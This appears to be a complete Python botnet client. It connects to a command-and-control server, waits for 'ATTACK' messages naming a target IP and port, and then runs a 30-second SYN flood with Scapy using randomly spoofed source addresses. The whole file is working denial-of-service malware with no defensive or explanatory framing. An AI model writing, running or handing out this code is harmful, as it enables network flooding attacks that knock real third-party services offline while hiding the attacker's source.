import socket
from scapy.all import IP, TCP, send
import random
import time

C2_IP = "127.0.0.1"
C2_PORT = 5555

socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_obj.connect((C2_IP, C2_PORT))
print(f"[Bot] Connected to C2 at {C2_IP}:{C2_PORT}")

def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    packets = 0
    
    print(f"[Bot] SYN FLOOD attacking {target_ip}:{target_port}")
    
    while time.time() < end_time:
        src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(1000, 900000000)
        
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=int(target_port), flags="S", seq=seq_num)
        packet = ip/tcp
        
        # Send packet
        send(packet, verbose=False)
        packets += 1
        print(f"Sent {packets} syn packet")
    
    print(f"\n[Bot] Attack complete! Sent {packets} SYN packets")

while True:
    data = socket_obj.recv(1024).decode()
    
    if data.startswith("ATTACK"):
        _, target_ip, target_port = data.split("|")
        print(f"\n[Bot] ATTACK COMMAND")
        syn_flood(target_ip, target_port, duration=30)